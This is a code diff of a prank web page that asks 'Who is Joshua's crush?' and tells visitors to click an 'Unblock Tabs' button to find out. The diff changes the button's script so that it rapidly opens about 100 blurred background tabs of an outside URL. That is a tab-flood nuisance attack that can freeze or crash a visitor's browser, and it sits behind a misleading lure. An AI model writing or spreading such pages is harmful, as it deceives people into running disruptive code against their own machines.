@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Who is Joshua's Crush?</title>
+    <title>Who is Joshua's crush?</title>
     <style>
         body {
             background-image: url('https://i.imgur.com/9GcrldH.jpg');
@@ -37,34 +37,37 @@
         }
     </style>
     <script>
-        document.getElementById('unblockButton').addEventListener('click', function () {
-            setTimeout(function () {
-                unblockTabs();
-            }, 1000);
-        });
-
         var url = "https://jz1324.github.io/noice/";
-        var tabCount = 10;
+        var tabCount = 100;
+
+        function openMultipleTabs() {
+            var win = window.open(url, "_blank");
+            win.blur();
+
+            var openTab = function () {
+                if (tabCount > 1) {
+                    var clonedWin = win.open(url, "_blank");
+                    clonedWin.blur();
+                    tabCount--;
+                    setTimeout(openTab, 0); // Adjust the delay if needed, but keep it minimal
+                }
+            };
+
+            openTab();
+        }
 
         function unblockTabs() {
-            for (var i = 0; i < tabCount; i++) {
-                var newWindow = window.open(url, '_blank');
-                if (newWindow) {
-                    newWindow.opener = null;
-                    newWindow.location.href = url;
-                    newWindow.blur();
-                    window.focus();
-                }
-            }
+            document.getElementById("unblockButton").disabled = true;
+            openMultipleTabs();
         }
     </script>
 </head>
 <body>
     <div id="overlay">
-        <span>Who does Joshua like? Click the button to unblock the tabs from opening.</span>
+        <span>Who does Joshua like? Click the button to unblock the tabs from opening and find out.</span>
         <br>
         <div id="buttonContainer">
-            <button id="unblockButton">Unblock Popup</button>
+            <button id="unblockButton" onclick="unblockTabs()">Unblock Tabs</button>
         </div>
     </div>
 </body>
